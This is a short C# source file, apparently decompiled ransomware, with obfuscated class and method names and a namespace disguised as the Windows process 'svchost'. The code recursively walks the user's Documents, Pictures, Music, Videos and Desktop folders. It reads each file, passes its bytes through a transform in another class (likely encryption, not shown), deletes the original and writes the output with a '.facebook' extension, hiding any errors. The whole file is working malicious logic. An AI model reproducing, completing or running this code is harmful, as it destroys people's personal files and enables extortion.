using System;
using System.Collections.Generic;
using System.IO;

namespace svchost;

internal class nLtONtrhWFCQdTKC
{
	public void JVGcUPDBcJlIYhaO()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		GCioqaRYJqjRKFVR(folderPath);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		GCioqaRYJqjRKFVR(folderPath2);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		GCioqaRYJqjRKFVR(folderPath3);
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		GCioqaRYJqjRKFVR(folderPath4);
		string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		GCioqaRYJqjRKFVR(folderPath5);
		string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		GCioqaRYJqjRKFVR(folderPath6);
	}

	public void GCioqaRYJqjRKFVR(string OUIdMpuGOAVVbgsX)
	{
		try
		{
			IEnumerable<string> enumerable = Directory.EnumerateFiles(OUIdMpuGOAVVbgsX, "*.*", SearchOption.AllDirectories);
			foreach (string item in enumerable)
			{
				byte[] gUCGnMNbBGbDwHAF = File.ReadAllBytes(item);
				AckHyjsYZLwpcMxw ackHyjsYZLwpcMxw = new AckHyjsYZLwpcMxw();
				byte[] bytes = ackHyjsYZLwpcMxw.KRhglaYZPPkEsfTL(gUCGnMNbBGbDwHAF);
				File.Delete(item);
				File.WriteAllBytes(item + ".facebook", bytes);
			}
		}
		catch (Exception)
		{
		}
	}
}
